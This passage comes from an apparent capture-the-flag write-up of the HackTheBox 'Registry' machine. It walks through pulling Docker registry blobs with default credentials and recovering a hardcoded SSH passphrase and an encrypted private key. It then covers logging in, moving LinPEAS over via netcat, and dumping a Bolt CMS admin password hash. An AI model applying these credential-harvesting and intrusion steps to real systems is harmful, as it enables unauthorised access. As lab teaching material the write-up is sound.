bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># move to .gz file</span></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry </span><br><span class="line">‚ùØ mv sha256\:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b sha256\:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># decompressed with gunzip</span></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry </span><br><span class="line">‚ùØ gunzip sha256\:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b.gz</span><br></pre></td></tr></table></figure><p>Finally i can now read whats is on the first blob.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry </span><br><span class="line">‚ùØ cat sha256\:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b </span><br><span class="line">etc/0040755000000000000000000000000013472256035010032 5ustar0000000000000000etc/profile.d/0040755000000000000000000000000013472256264011720 5ustar0000000000000000etc/profile.d/01-ssh.sh0100755000000000000000000000033613472067523013267 0ustar0000000000000000<span class="comment">#!/usr/bin/expect -f</span></span><br><span class="line"><span class="comment">#eval `ssh-agent -s`</span></span><br><span class="line">spawn ssh-add /root/.ssh/id_rsa</span><br><span class="line">expect <span class="string">"Enter passphrase for /root/.ssh/id_rsa:"</span></span><br><span class="line">send <span class="string">"GkOcz221Ftb3ugog\n"</span>;</span><br><span class="line">expect <span class="string">"Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"</span></span><br><span class="line">interact</span><br><span class="line">etc/profile.d/.wh.02-ssh.sh0000600000000000000000000000000013472256232013730 0ustar0000000000000000</span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>Base on the first blob i download it looks like the <code>&quot;GkOcz221Ftb3ugog&quot;</code> is a password for <strong><em>SSH Key</em></strong> but I don‚Äôt have the <code>id_rsa</code> which is needed as from this line.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">expect <span class="string">"Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"</span></span><br></pre></td></tr></table></figure><h3 id="Hunting-the-Private-key"><a href="#Hunting-the-Private-key" class="headerlink" title="Hunting the Private key"></a>Hunting the Private key</h3><p>So i need more blobSum to get the <code>id_rsa key</code>, the 2nd blob was empty. and thid blob looks interesting this one is 100 mb total of files so:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> boxes/Registry/docker </span><br><span class="line">‚ùØ wget --no-check-certificate --http-user=admin --http-password=admin https://docker.registry.htb/v2/bolt-image/blobs/sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791</span><br><span class="line">--2020-04-04 09:03:19--  https://docker.registry.htb/v2/bolt-image/blobs/sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791</span><br><span class="line">Resolving docker.registry.htb (docker.registry.htb)... 10.10.10.159</span><br><span class="line">Connecting to docker.registry.htb (docker.registry.htb)|10.10.10.159|:443... connected.</span><br><span class="line">WARNING: The certificate of ‚Äòdocker.registry.htb‚Äô is not trusted.</span><br><span class="line">WARNING: The certificate of ‚Äòdocker.registry.htb‚Äô doesn<span class="string">'t have a known issuer.</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 401 Unauthorized</span></span><br><span class="line"><span class="string">Authentication selected: Basic realm="Registry"</span></span><br><span class="line"><span class="string">Reusing existing connection to docker.registry.htb:443.</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 200 OK</span></span><br><span class="line"><span class="string">Length: 104569678 (100M) [application/octet-stream]</span></span><br><span class="line"><span class="string">Saving to: ‚Äòsha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791‚Äô</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sha256:2931a8b44e495489fdbe2bccd7232e99b182034 100%[===================================================================================================&gt;]  99.72M   752KB/s    in 2m 56s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2020-04-04 09:06:16 (580 KB/s) - ‚Äòsha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791‚Äô saved [104569678/104569678]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root in boxes/Registry/docker took 2m57s </span></span><br><span class="line"><span class="string">‚ùØ</span></span><br></pre></td></tr></table></figure><h3 id="Get-in-into-the-REGISTRY"><a href="#Get-in-into-the-REGISTRY" class="headerlink" title="Get in into the REGISTRY"></a>Get in into the REGISTRY</h3><p>after the download finished I explore the <code>/root</code> directory which contains the <code>.ssh</code> directory which has <code>id_rsa</code> and <code>config</code> file.</p><p><img src="/img/registry/registry-rsa-key.png" alt="HackTheBox-Registry" title="Registry NGINX"></p><p>I look first at the config file and the user for <strong><em>SSH</em></strong> is <strong><em>bolt</em></strong></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">Host registry</span><br><span class="line">  User bolt</span><br><span class="line">  Port 22</span><br><span class="line">  Hostname registry.htb</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791 (1)/root/.ssh</span><br></pre></td></tr></table></figure><p>and the <strong><em>RSA Key</em></strong></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> boxes/Registry/docker</span><br><span class="line">‚ùØ cat id_rsa</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,1C98FA248505F287CCC597A59CF83AB9</span><br><span class="line"></span><br><span class="line">KF9YHXRjDZ35Q9ybzkhcUNKF8DSZ+aNLYXPL3kgdqlUqwfpqpbVdHbMeDk7qbS7w</span><br><span class="line">KhUv4Gj22O1t3koy9z0J0LpVM8NLMgVZhTj1eAlJO72dKBNNv5D4qkIDANmZeAGv</span><br><span class="line">7RwWef8FwE3jTzCDynKJbf93Gpy/hj/SDAe77PD8J/Yi01Ni6MKoxvKczL/gktFL</span><br><span class="line">/mURh0vdBrIfF4psnYiOcIDCkM2EhcVCGXN6BSUxBud+AXF0QP96/8UN8A5+O115</span><br><span class="line">p7eljdDr2Ie2LlF7dhHSSEMQG7lUqfEcTmsqSuj9lBwfN22OhFxByxPvkC6kbSyH</span><br><span class="line">XnUqf+utie21kkQzU1lchtec8Q4BJIMnRfv1kufHJjPFJMuWFRbYAYlL7ODcpIvt</span><br><span class="line">UgWJgsYyquf/61kkaSmc8OrHc0XOkif9KE63tyWwLefOZgVgrx7WUNRNt8qpjHiT</span><br><span class="line">nfcjTEcOSauYmGtXoEI8LZ+oPBniwCB4Qx/TMewia/qU6cGfX9ilnlpXaWvbq39D</span><br><span class="line">F1KTFBvwkM9S1aRJaPYu1szLrGeqOGH66dL24f4z4Gh69AZ5BCYgyt3H2+FzZcRC</span><br><span class="line">iSnwc7hdyjDI365ZF0on67uKVDfe8s+EgXjJWWYWT7rwxdWOCzhd10TYuSdZv3MB</span><br><span class="line">TdY/nF7oLJYyO2snmedg2x11vIG3fVgvJa9lDfy5cA9teA3swlOSkeBqjRN+PocS</span><br><span class="line">5/9RBV8c3HlP41I/+oV5uUTInaxCZ/eVBGVgVe5ACq2Q8HvW3HDvLEz36lTw+kGE</span><br><span class="line">SxbxZTx1CtLuyPz7oVxaCStn7Cl582MmXlp/MBU0LqodV44xfhnjmDPUK6cbFBQc</span><br><span class="line">GUeTlxw+gRwby4ebLLGdTtuYiJQDlZ8itRMTGIHLyWJEGVnO4MsX0bAOnkBRllhA</span><br><span class="line">CqceFXlVE+K3OfGpo3ZYj3P3xBeDG38koE2CaxEKQazHc06aF5zlcxUNBusOxNK4</span><br><span class="line">ch2x+BpuhB0DWavdonHj+ZU9nuCLUhdy3kjg0FxqgHKZo3k55ai+4hFUIT5fTNHA</span><br><span class="line">iuMLFSAwONGOf+926QUQd1xoeb/n8h5b0kFYYVD3Vkt4Fb+iBStVG6pCneN2lILq</span><br><span class="line">rSVi9oOIy+NRrBg09ZpMLXIQXLhHSk3I7vMhcPoWzBxPyMU29ffxouK0HhkARaSP</span><br><span class="line">3psqRVI5GPsnGuWLfyB2HNgQWNHYQoILdrPOpprxUubnRg7gExGpmPZALHPed8GP</span><br><span class="line">pLuvFCgn+SCf+DBWjMuzP3XSoN9qBSYeX8OKg5r3V19bhz24i2q/HMULWQ6PLzNb</span><br><span class="line">v0NkNzCg3AXNEKWaqF6wi7DjnHYgWMzmpzuLj7BOZvLwWJSLvONTBJDFa4fK5nUH</span><br><span class="line">UnYGl+WT+aYpMfp6vd6iMtet0bh9wif68DsWqaqTkPl58z80gxyhpC2CGyEVZm/h</span><br><span class="line">P03LMb2YQUOzBBTL7hOLr1VuplapAx9lFp6hETExaM6SsCp/StaJfl0mme8tw0ue</span><br><span class="line">QtwguqwQiHrmtbp2qsaOUB0LivMSzyJjp3hWHFUSYkcYicMnsaFW+fpt+ZeGGWFX</span><br><span class="line">bVpjhWwaBftgd+KNg9xl5RTNXs3hjJePHc5y06SfOpOBYqgdL42UlAcSEwoQ76VB</span><br><span class="line">YGk+dTQrDILawDDGnSiOGMrn4hzmtRAarLZWvGiOdppdIqsfpKYfUcsgENjTK95z</span><br><span class="line">zrey3tjXzObM5L1MkjYYIYVjXMMygJDaPLQZfZTchUNp8uWdnamIVrvqHGvWYES/</span><br><span class="line">FGoeATGL9J5NVXlMA2fXRue84sR7q3ikLgxDtlh6w5TpO19pGBO9Cmg1+1jqRfof</span><br><span class="line">eIb4IpAp01AVnMl/D/aZlHb7adV+snGydmT1S9oaN+3z/3pHQu3Wd7NWsGMDmNdA</span><br><span class="line">+GB79xf0rkL0E6lRi7eSySuggposc4AHPAzWYx67IK2g2kxx9M4lCImUO3oftGKJ</span><br><span class="line">P/ccClA4WKFMshADxxh/eWJLCCSEGvaLoow+b1lcIheDYmOxQykBmg5AM3WpTpAN</span><br><span class="line">T+bI/6RA+2aUm92bNG+P/Ycsvvyh/jFm5vwoxuKwINUrkACdQ3gRakBc1eH2x014</span><br><span class="line">6B/Yw+ZGcyj738GHH2ikfyrngk1M+7IFGstOhUed7pZORnhvgpgwFporhNOtlvZ1</span><br><span class="line">/e9jJqfo6W8MMDAe4SxCMDujGRFiABU3FzD5FjbqDzn08soaoylsNQd/BF7iG1RB</span><br><span class="line">Y7FEPw7yZRbYfiY8kfve7dgSKfOADj98fTe4ISDG9mP+upmR7p8ULGvt+DjbPVd3</span><br><span class="line">uN3LZHaX5ECawEt//KvO0q87TP8b0pofBhTmJHUUnVW2ryKuF4IkUM3JKvAUTSg8</span><br><span class="line">K+4aT7xkNoQ84UEQvfZvUfgIpxcj6kZYnF+eakV4opmgJjVgmVQvEW4nf6ZMBRo8</span><br><span class="line">TTGugKvvTw/wNKp4BkHgXxWjyTq+5gLyppKb9sKVHVzAEpew3V20Uc30CzOyVJZi</span><br><span class="line">Bdtfi9goJBFb6P7yHapZ13W30b96ZQG4Gdf4ZeV6MPMizcTbiggZRBokZLCBMb5H</span><br><span class="line">pgkPgTrGJlbm+sLu/kt4jgex3T/NWwXHVrny5kIuTbbv1fXfyfkPqU66eysstO2s</span><br><span class="line">OxciNk4W41o9YqHHYM9D/uL6xMqO3K/LTYUI+LcCK13pkjP7/zH+bqiClfNt0D2B</span><br><span class="line">Xg6OWYK7E/DTqX+7zqNQp726sDAYKqQNpwgHldyDhOG3i8o66mLj3xODHQzBvwKR</span><br><span class="line">bJ7jrLPW+AmQwo/V8ElNFPyP6oZBEdoNVn/plMDAi0ZzBHJc7hJ0JuHnMggWFXBM</span><br><span class="line">PjxG/w4c8XV/Y2WavafEjT7hHuviSo6phoED5Zb3Iu+BU+qoEaNM/LntDwBXNEVu</span><br><span class="line">Z0pIXd5Q2EloUZDXoeyMCqO/NkcIFkx+//BDddVTFmfw21v2Y8fZ2rivF/8CeXXZ</span><br><span class="line">ot6kFb4G6gcxGpqSZKY7IHSp49I4kFsC7+tx7LU5/wqC9vZfuds/TM7Z+uECPOYI</span><br><span class="line">f41H5YN+V14S5rU97re2w49vrBxM67K+x930niGVHnqk7t/T1jcErROrhMeT6go9</span><br><span class="line">RLI9xScv6aJan6xHS+nWgxpPA7YNo2rknk/ZeUnWXSTLYyrC43dyPS4FvG8N0H1V</span><br><span class="line">94Vcvj5Kmzv0FxwVu4epWNkLTZCJPBszTKiaEWWS+OLDh7lrcmm+GP54MsLBWVpr</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791 (1)/root/.ssh </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>I move the the <strong><em>id_rsa</em></strong> in my registry directory and do the <strong><em>SSH Login</em></strong> so:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Registry </span><br><span class="line">‚ùØ ssh -v -i id_rsa bolt@registry.htb</span><br><span class="line">OpenSSH_8.1p1 Debian-1, OpenSSL 1.1.1d  10 Sep 2019</span><br><span class="line">debug1: Reading configuration data /etc/ssh/ssh_config</span><br><span class="line">debug1: /etc/ssh/ssh_config line 19: Applying options <span class="keyword">for</span> *</span><br><span class="line">debug1: Connecting to registry.htb [10.10.10.159] port 22.</span><br><span class="line">debug1: Connection established.</span><br><span class="line">debug1: identity file id_rsa <span class="built_in">type</span> 0</span><br><span class="line">debug1: identity file id_rsa-cert <span class="built_in">type</span> -1</span><br><span class="line">debug1: Local version string SSH-2.0-OpenSSH_8.1p1 Debian-1</span><br><span class="line">debug1: Remote protocol version 2.0, remote software version OpenSSH_7.6p1 Ubuntu-4ubuntu0.3</span><br><span class="line">debug1: match: OpenSSH_7.6p1 Ubuntu-4ubuntu0.3 pat OpenSSH_7.0*,OpenSSH_7.1*,OpenSSH_7.2*,OpenSSH_7.3*,OpenSSH_7.4*,OpenSSH_7.5*,OpenSSH_7.6*,OpenSSH_7.7* compat 0x04000002</span><br><span class="line">debug1: Authenticating to registry.htb:22 as <span class="string">'bolt'</span></span><br><span class="line">debug1: SSH2_MSG_KEXINIT sent</span><br><span class="line">debug1: SSH2_MSG_KEXINIT received</span><br><span class="line">debug1: kex: algorithm: curve25519-sha256</span><br><span class="line">debug1: kex: host key algorithm: ecdsa-sha2-nistp256</span><br><span class="line">debug1: kex: server-&gt;client cipher: chacha20-poly1305@openssh.com MAC: &lt;implicit&gt; compression: none</span><br><span class="line">debug1: kex: client-&gt;server cipher: chacha20-poly1305@openssh.com MAC: &lt;implicit&gt; compression: none</span><br><span class="line">debug1: expecting SSH2_MSG_KEX_ECDH_REPLY</span><br><span class="line">debug1: Server host key: ecdsa-sha2-nistp256 SHA256:G1J5ek/T6KuCCT7Xp2IN1LUslRt24mhmhKUo/kWWVrs</span><br><span class="line">debug1: Host <span class="string">'registry.htb'</span> is known and matches the ECDSA host key.</span><br><span class="line">debug1: Found key <span class="keyword">in</span> /root/.ssh/known_hosts:5</span><br><span class="line">debug1: rekey out after 134217728 blocks</span><br><span class="line">debug1: SSH2_MSG_NEWKEYS sent</span><br><span class="line">debug1: expecting SSH2_MSG_NEWKEYS</span><br><span class="line">debug1: SSH2_MSG_NEWKEYS received</span><br><span class="line">debug1: rekey <span class="keyword">in</span> after 134217728 blocks</span><br><span class="line">debug1: Will attempt key: id_rsa RSA SHA256:XYmIvRC1pWwn6TnuAismBkezuFTeVa0viiqKVkR36w4 explicit</span><br><span class="line">debug1: SSH2_MSG_EXT_INFO received</span><br><span class="line">debug1: kex_input_ext_info: server-sig-algs=&lt;ssh-ed25519,ssh-rsa,rsa-sha2-256,rsa-sha2-512,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521&gt;</span><br><span class="line">debug1: SSH2_MSG_SERVICE_ACCEPT received</span><br><span class="line">debug1: Authentications that can <span class="built_in">continue</span>: publickey,password</span><br><span class="line">debug1: Next authentication method: publickey</span><br><span class="line">debug1: Offering public key: id_rsa RSA SHA256:XYmIvRC1pWwn6TnuAismBkezuFTeVa0viiqKVkR36w4 explicit</span><br><span class="line">debug1: Server accepts key: id_rsa RSA SHA256:XYmIvRC1pWwn6TnuAismBkezuFTeVa0viiqKVkR36w4 explicit</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">'id_rsa'</span>: </span><br><span class="line">debug1: Authentication succeeded (publickey).</span><br><span class="line">Authenticated to registry.htb ([10.10.10.159]:22).</span><br><span class="line">debug1: channel 0: new [client-session]</span><br><span class="line">debug1: Requesting no-more-sessions@openssh.com</span><br><span class="line">debug1: Entering interactive session.</span><br><span class="line">debug1: pledge: network</span><br><span class="line">debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0</span><br><span class="line">debug1: Sending environment.</span><br><span class="line">debug1: Sending env LANG = en_US.utf8</span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)</span><br><span class="line"></span><br><span class="line">  System information as of Sat Apr  4 01:14:31 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Users logged <span class="keyword">in</span>:                1</span><br><span class="line">  Usage of /:   5.7% of 61.80GB   IP address <span class="keyword">for</span> eth0:            10.10.10.159</span><br><span class="line">  Memory usage: 39%               IP address <span class="keyword">for</span> br-1bad9bd75d17: 172.18.0.1</span><br><span class="line">  Swap usage:   0%                IP address <span class="keyword">for</span> docker0:         172.17.0.1</span><br><span class="line">  Processes:    163</span><br><span class="line">Last login: Sat Apr  4 00:57:04 2020 from 10.10.15.8</span><br><span class="line">bolt@bolt:~$ whoami &amp; hostname</span><br><span class="line">[1] 6324</span><br><span class="line">bolt</span><br><span class="line">bolt</span><br><span class="line">bolt@bolt:~$</span><br></pre></td></tr></table></figure><p>and Finally i can now get the <code>user.txt</code></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)</span><br><span class="line"></span><br><span class="line">  System information as of Sat Apr  4 01:14:31 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.0               Users logged <span class="keyword">in</span>:                1</span><br><span class="line">  Usage of /:   5.7% of 61.80GB   IP address <span class="keyword">for</span> eth0:            10.10.10.159</span><br><span class="line">  Memory usage: 39%               IP address <span class="keyword">for</span> br-1bad9bd75d17: 172.18.0.1</span><br><span class="line">  Swap usage:   0%                IP address <span class="keyword">for</span> docker0:         172.17.0.1</span><br><span class="line">  Processes:    163</span><br><span class="line">Last login: Sat Apr  4 00:57:04 2020 from 10.10.15.8</span><br><span class="line">bolt@bolt:~$ whoami &amp; hostname</span><br><span class="line">[1] 6324</span><br><span class="line">bolt</span><br><span class="line">bolt</span><br><span class="line">bolt@bolt:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">[1]+  Done                    whoami</span><br><span class="line">bolt@bolt:~$ cat user.txt</span><br><span class="line">ytc0y[-----------------------]3ywzi</span><br><span class="line">bolt@bolt:~$</span><br></pre></td></tr></table></figure><hr><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>So it‚Äôs time to do enumeration again the <code>bolt user shell</code>, I tried <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS" target="_blank" rel="noopener">LinPEAS</a> to enumerate the shell, then I found out that there was a CMS installed in the machine which is <code>&quot;Bolt CMS&quot;</code></p><p>wget, curl was not working, so I try <strong><em>netcat</em></strong> to transfer the <code>linpeash.sh</code></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># on my registry machine (the receiver)</span></span><br><span class="line">bolt@bolt:/tmp$ nc -l -p 1234 &gt; linpeas.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># and on my kali linux machine (the sender)</span></span><br><span class="line">root <span class="keyword">in</span> boxes/Registry/docker</span><br><span class="line">‚ùØ nc -w 3 10.10.10.159 1234 &lt; linpeas.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># run linpeas on registry</span></span><br><span class="line">bolt@bolt:/tmp$ chmod +x linpeas.sh</span><br><span class="line">bolt@bolt:/tmp$ bash linpeas.sh</span><br></pre></td></tr></table></figure><h3 id="Registry-Basic-Information"><a href="#Registry-Basic-Information" class="headerlink" title="Registry Basic Information"></a>Registry Basic Information</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">====================================( Basic information )=====================================</span><br><span class="line">OS: Linux version <span class="number">4.15</span><span class="number">.0</span><span class="number">-65</span>-generic (buildd@lgw01-amd64<span class="number">-006</span>) (gcc version <span class="number">7.4</span><span class="number">.0</span> (Ubuntu <span class="number">7.4</span><span class="number">.0</span><span class="number">-1u</span>buntu1~<span class="number">18.04</span><span class="number">.1</span>)) #<span class="number">74</span>-Ubuntu SMP Tue Sep <span class="number">17</span> <span class="number">17</span>:<span class="number">06</span>:<span class="number">04</span> UTC <span class="number">2019</span></span><br><span class="line">User &amp; Groups: uid=<span class="number">1001</span>(bolt) gid=<span class="number">1001</span>(bolt) groups=<span class="number">1001</span>(bolt)</span><br><span class="line">Hostname: bolt</span><br><span class="line">Writable folder: /dev/shm</span><br><span class="line">[+] /bin/ping is <span class="built_in">available</span> <span class="keyword">for</span> network discovery (linpeas can discover hosts, learn more with -h)</span><br><span class="line">[+] /bin/nc is <span class="built_in">available</span> <span class="keyword">for</span> network discover &amp; port scanning (linpeas can discover hosts <span class="keyword">and</span> scan ports, learn more with -h)</span><br><span class="line">[+] nmap is <span class="built_in">available</span> <span class="keyword">for</span> network discover &amp; port scanning, you should use it yourself</span><br></pre></td></tr></table></figure><h3 id="BOLT-CMS-WEBSITE"><a href="#BOLT-CMS-WEBSITE" class="headerlink" title="BOLT CMS WEBSITE"></a>BOLT CMS WEBSITE</h3><p>Going deep of recon I see <code>db.sqlite</code> which contains a password hash, and installed CMS Website at <code>/var/www/html</code> directory.</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">[+] Looking <span class="keyword">for</span> tables inside readable .db/.<span class="function">sqlite <span class="title">files</span> <span class="params">(limit <span class="number">100</span>)</span></span></span><br><span class="line"> -&gt; Extracting tables from /var/www/html/bolt/vendor/codeception/codeception/tests/data/sqlite.db (limit 20)                                                                               </span><br><span class="line"> -&gt; Extracting tables from /var/www/html/bolt/tests/phpunit/unit/resources/db/bolt.db (limit <span class="number">20</span>)                                                                                           </span><br><span class="line">  --&gt; <span class="function">Found <span class="keyword">for</span> interesting column names in <span class="title">bolt_authtoken</span> <span class="params">(output limit <span class="number">10</span>)</span>                                                                                                               </span></span><br><span class="line"><span class="function">CREATE TABLE <span class="title">bolt_authtoken</span> <span class="params">(id INTEGER NOT <span class="literal">NULL</span>, user_id INTEGER <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, username VARCHAR(<span class="number">32</span>) <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, token VARCHAR(<span class="number">128</span>) NOT <span class="literal">NULL</span>, salt VARCHAR(<span class="number">128</span>) NOT <span class="literal">NULL</span>, lastseen DATETIME <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, ip VARCHAR(<span class="number">45</span>) <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, useragent VARCHAR(<span class="number">128</span>) <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, validity DATETIME <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, PRIMARY KEY(id))</span></span></span><br><span class="line">  --&gt; Found for interesting column names in bolt_users (output limit 10)</span><br><span class="line"><span class="function">CREATE TABLE <span class="title">bolt_users</span> <span class="params">(id INTEGER NOT <span class="literal">NULL</span>, username VARCHAR(<span class="number">32</span>) NOT <span class="literal">NULL</span>, password VARCHAR(<span class="number">128</span>) NOT <span class="literal">NULL</span>, email VARCHAR(<span class="number">254</span>) NOT <span class="literal">NULL</span>, lastseen DATETIME <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, lastip VARCHAR(<span class="number">45</span>) <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, displayname VARCHAR(<span class="number">32</span>) NOT <span class="literal">NULL</span>, <span class="built_in">stack</span> CLOB NOT <span class="literal">NULL</span> --(DC2Type:json)</span></span></span><br><span class="line"><span class="function"><span class="params">, enabled BOOLEAN <span class="literal">DEFAULT</span> <span class="string">'1'</span> NOT <span class="literal">NULL</span>, shadowpassword VARCHAR(<span class="number">128</span>) <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, shadowtoken VARCHAR(<span class="number">128</span>) <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, shadowvalidity DATETIME <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, failedlogins INTEGER <span class="literal">DEFAULT</span> <span class="number">0</span> NOT <span class="literal">NULL</span>, throttleduntil DATETIME <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, roles CLOB NOT <span class="literal">NULL</span> --(DC2Type:json)</span></span></span><br><span class="line"><span class="function"><span class="params">, PRIMARY KEY(id))</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"> -&gt; Extracting tables from /var/www/html/bolt/app/database/bolt.db (limit 20)</span><br><span class="line">  --&gt; <span class="function">Found <span class="keyword">for</span> interesting column names in <span class="title">bolt_authtoken</span> <span class="params">(output limit <span class="number">10</span>)</span>                                                                                                               </span></span><br><span class="line"><span class="function">CREATE TABLE <span class="title">bolt_authtoken</span> <span class="params">(id INTEGER PRIMARY KEY AUTOINCREMENT NOT <span class="literal">NULL</span>, user_id INTEGER <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, username VARCHAR(<span class="number">32</span>) <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, token VARCHAR(<span class="number">128</span>) NOT <span class="literal">NULL</span>, salt VARCHAR(<span class="number">128</span>) NOT <span class="literal">NULL</span>, lastseen DATETIME <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, ip VARCHAR(<span class="number">45</span>) <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, useragent VARCHAR(<span class="number">128</span>) <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, validity DATETIME <span class="literal">DEFAULT</span> <span class="literal">NULL</span>)</span></span></span><br><span class="line">9, 1, None, 2e3f688aab59a4586f54fbd3f284eb3b941b0580142356d840c7e582801b6388, 33aa58459b97be252a29fd98e3cdf81b, 2020-04-04 18:48:37, 10.10.15.104, Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0, 2020-04-18 18:48:37</span><br><span class="line">  --&gt; <span class="function">Found <span class="keyword">for</span> interesting column names in <span class="title">bolt_users</span> <span class="params">(output limit <span class="number">10</span>)</span></span></span><br><span class="line"><span class="function">CREATE TABLE <span class="title">bolt_users</span> <span class="params">(id INTEGER PRIMARY KEY AUTOINCREMENT NOT <span class="literal">NULL</span>, username VARCHAR(<span class="number">32</span>) NOT <span class="literal">NULL</span>, password VARCHAR(<span class="number">128</span>) NOT <span class="literal">NULL</span>, email VARCHAR(<span class="number">254</span>) NOT <span class="literal">NULL</span>, lastseen DATETIME <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, lastip VARCHAR(<span class="number">45</span>) <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, displayname VARCHAR(<span class="number">32</span>) NOT <span class="literal">NULL</span>, <span class="built_in">stack</span> CLOB NOT <span class="literal">NULL</span> --(DC2Type:json)</span></span></span><br><span class="line"><span class="function"><span class="params">, enabled BOOLEAN <span class="literal">DEFAULT</span> <span class="string">'1'</span> NOT <span class="literal">NULL</span>, shadowpassword VARCHAR(<span class="number">128</span>) <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, shadowtoken VARCHAR(<span class="number">128</span>) <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, shadowvalidity DATETIME <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, failedlogins INTEGER <span class="literal">DEFAULT</span> <span class="number">0</span> NOT <span class="literal">NULL</span>, throttleduntil DATETIME <span class="literal">DEFAULT</span> <span class="literal">NULL</span>, roles CLOB NOT <span class="literal">NULL</span> --(DC2Type:json)</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line">1, admin, $2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK, bolt@registry.htb, 2020-04-04 22:00:22, 10.10.15.139, Admin, ["files://lass.php"], 1, None, None, None, 0, None, ["root","everyone"]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Web files?(output limit)</span><br><span class="line">/var/www/:                                                                                                                                                                                 </span><br><span class="line">total <span class="number">16</span>K</span><br><span class="line">drwxr-xr-x  <span class="number">4</span> root     root     <span class="number">4.0</span>K May <span class="number">26</span>  